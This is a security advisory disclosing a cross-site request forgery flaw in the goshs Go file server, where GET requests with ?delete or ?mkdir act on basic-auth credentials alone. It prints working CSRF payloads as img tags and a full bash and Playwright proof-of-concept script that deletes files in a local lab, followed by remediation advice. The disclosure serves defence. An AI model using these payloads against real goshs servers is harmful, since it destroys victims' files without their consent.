# [M] goshs has CSRF in state-changing GET routes enables authenticated file deletion and directory creation

## Summary
Severity: Medium
Advisory: GHSA-jrq5-hg6x-j6g3
CVE: CVE-2026-40883
CWE: CWE-352
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-04-14
Source: https://github.com/advisories/GHSA-jrq5-hg6x-j6g3
Type: github-advisory

## Affected
- Go: `github.com/patrickhener/goshs/v2` — affected >=2.0.0-beta.4 <2.0.0-beta.6

## Details
### Summary
goshs contains a cross-site request forgery issue in its state-changing HTTP GET routes. An external attacker can cause an already authenticated browser to trigger destructive actions such as `?delete` and `?mkdir` because goshs relies on HTTP basic auth alone and performs no CSRF, `Origin`, or `Referer` validation for those routes. I reproduced this on `v2.0.0-beta.5`.

### Details
The vulnerable request handling is reachable through normal GET requests:

- `httpserver/handler.go:118-123` dispatches `?mkdir` directly to `handleMkdir()`
- `httpserver/handler.go:180-186` dispatches `?delete` directly to `deleteFile()`

Authentication is enforced only by HTTP basic auth:

- `httpserver/middleware.go:20-87` accepts any request that presents valid cached or replayed basic-auth credentials

The resulting state changes hit filesystem mutation sinks:

- `httpserver/handler.go:683-718` calls `os.RemoveAll()` in `deleteFile()`
- `httpserver/handler.go:961-1000` calls `os.MkdirAll()` in `handleMkdir()`

Because browsers can replay HTTP basic-auth credentials on subresource requests, an attacker-controlled page can embed:

- `<img src="http://127.0.0.1:18095/victim.txt?delete">`
- `<img src="http://127.0.0.1:18095/csrfmade?mkdir">`

If the victim has already authenticated to goshs, those requests are treated as legitimate authenticated actions and the server mutates the filesystem.

### PoC
Manual verification commands used:

`Terminal 1`

```bash
cd '/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5'
go build -o /tmp/goshs_beta5 ./

rm -rf /tmp/goshs_csrf_root /tmp/goshs_csrf_site
mkdir -p /tmp/goshs_csrf_root /tmp/goshs_csrf_site
printf 'delete me\n' > /tmp/goshs_csrf_root/victim.txt

cat > /tmp/goshs_csrf_site/delete.html <<'HTML'
<!doctype html>
<html>
  <body>
    <img src="http://127.0.0.1:18095/victim.txt?delete">
  </body>
</html>
HTML

cat > /tmp/goshs_csrf_site/mkdir.html <<'HTML'
<!doctype html>
<html>
  <body>
    <img src="http://127.0.0.1:18095/csrfmade?mkdir">
  </body>
</html>
HTML

/tmp/goshs_beta5 -d /tmp/goshs_csrf_root -p 18095 -b 'u:p'
```

`Terminal 2`

```bash
python3 -m http.server 18889 --directory /tmp/goshs_csrf_site
```

Victim actions:

1. Open `http://127.0.0.1:18095/` in a browser and authenticate with `u:p`.
2. Visit `http://127.0.0.1:18889/delete.html`.
3. Visit `http://127.0.0.1:18889/mkdir.html`.

Two terminal commands I ran during local validation:

```bash
test -e /tmp/goshs_csrf_root/victim.txt && echo EXISTS || echo DELETED
test -d /tmp/goshs_csrf_root/csrfmade && echo CREATED || echo MISSING
```

Expected result:

- the first check prints `DELETED`
- the second check prints `CREATED`

PoC Video 1:

https://github.com/user-attachments/assets/94b78934-0a70-479f-9b89-43a859939473



Single-script verification:

```bash
'/Users/r1zzg0d/Documents/CVE hunting/output/poc/gosh_poc3'
```

Observed script result:

- `Delete status: DELETED`
- `mkdir status: CREATED`
- `[RESULT] VULNERABLE: attacker-controlled pages triggered authenticated state changes via GET`

PoC Video 2:

https://github.com/user-attachments/assets/1143e039-81e4-4476-a1c3-f81ae46c9ede



`gosh_poc3` script content:

```bash
#!/usr/bin/env bash
set -euo pipefail

REPO='/Users/r1zzg0d/Documents/CVE hunting/targets/goshs_beta5'
PLAY_DIR='/tmp/codex-playwright'
BIN='/tmp/goshs_beta5_csrf'
PORT='18095'
ATTACKER_PORT='18889'
CHROME='/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
WORKDIR="$(mktemp -d /tmp/goshs-csrf-beta5-XXXXXX)"
ROOT="$WORKDIR/root"
SITE="$WORKDIR/site"
GOSHS_PID=""
ATTACKER_PID=""

cleanup() {
  if [[ -n "${ATTACKER_PID:-}" ]]; then
    kill "${ATTACKER_PID}" >/dev/null 2>&1 || true
  fi
  if [[ -n "${GOSHS_PID:-}" ]]; then
    kill "${GOSHS_PID}" >/dev/null 2>&1 || true
  fi
}
trap cleanup EXIT

mkdir -p "$ROOT" "$SITE"
printf 'delete me\n' > "$ROOT/victim.txt"

cat > "$SITE/delete.html" <<HTML
<!doctype html>
<html>
  <body>
    <img src="http://127.0.0.1:${PORT}/victim.txt?delete">
  </body>
</html>
HTML

cat > "$SITE/mkdir.html" <<HTML
<!doctype html>
<html>
  <body>
    <img src="http://127.0.0.1:${PORT}/csrfmade?mkdir">
  </body>
</html>
HTML

echo "[1/6] Building goshs beta.5"
(cd "$REPO" && go build -o "$BIN" ./)

echo "[2/6] Starting goshs with HTTP basic auth"
"$BIN" -d "$ROOT" -p "$PORT" -b 'u:p' >"$WORKDIR/goshs.log" 2>&1 &
GOSHS_PID=$!

for _ in $(seq 1 40); do
  if curl -s -u u:p "http://127.0.0.1:${PORT}/" >/dev/null 2>&1; then
    break
  fi
  sleep 0.25
done

echo "[3/6] Serving attacker pages"
python3 -m http.server "$ATTACKER_PORT" --directory "$SITE" >"$WORKDIR/attacker.log" 2>&1 &
ATTACKER_PID=$!

if [[ ! -d "$PLAY_DIR/node_modules/playwright-core" ]]; then
  mkdir -p "$PLAY_DIR"
  (cd "$PLAY_DIR" && npm install --no-save playwright-core >/dev/null)
fi

if [[ ! -x "$CHROME" ]]; then
  echo "[ERROR] Chrome not found at $CHROME" >&2
  exit 1
fi

echo "[4/6] Visiting attacker pages from an authenticated browser"
node - <<'NODE'
const { chromium } = require('/tmp/codex-playwright/node_modules/playwright-core');

(async () => {
  const browser = await chromium.launch({
    headless: true,
    executablePath: '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome',
  });
  const context = await browser.newContext({
    httpCredentials: { username: 'u', password: 'p' },
  });
  const page = await context.newPage();
  await page.goto('http://127.0.0.1:18095/', { waitUntil: 'domcontentloaded' });
  await page.goto('http://127.0.0.1:18889/delete.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1200);
  await page.goto('http://127.0.0.1:18889/mkdir.html', { waitUntil: 'domcontentloaded' });
  await page.waitForTimeout(1200);
  await browser.close();
})();
NODE

echo "[5/6] Verifying impact"
DELETE_STATUS="MISSING"
MKDIR_STATUS="MISSING"
if [[ ! -e "$ROOT/victim.txt" ]]; then
  DELETE_STATUS="DELETED"
fi
if [[ -d "$ROOT/csrfmade" ]]; then
  MKDIR_STATUS="CREATED"
fi

echo "[6/6] Results"
echo "Delete status: $DELETE_STATUS"
echo "mkdir status: $MKDIR_STATUS"

if [[ "$DELETE_STATUS" == "DELETED" && "$MKDIR_STATUS" == "CREATED" ]]; then
  echo '[RESULT] VULNERABLE: attacker-controlled pages triggered authenticated state changes via GET'
else
  echo '[RESULT] NOT REPRODUCED'
  exit 1
fi
```

### Impact
This issue lets an external attacker abuse an authenticated victim's browser to perform filesystem mutations on the goshs server. In the demonstrated case, the attacker deletes an existing file and creates a new directory without the victim intentionally performing either action. Any deployment that relies on HTTP basic auth for web access is exposed to cross-site state changes when a user visits attacker-controlled content while authenticated.

### Remediation
Suggested fixes:

1. Move all state-changing functionality such as `delete` and `mkdir` off GET routes and require non-idempotent methods such as `POST` or `DELETE`.
2. Add CSRF protections for authenticated browser actions, including per-request CSRF tokens plus strict `Origin` and `Referer` validation.
3. Treat any rendered HTML content as untrusted and isolate it from issuing authenticated same-origin requests.

## References
- https://github.com/patrickhener/goshs/security/advisories/GHSA-jrq5-hg6x-j6g3
- https://nvd.nist.gov/vuln/detail/CVE-2026-40883
- https://github.com/patrickhener/goshs
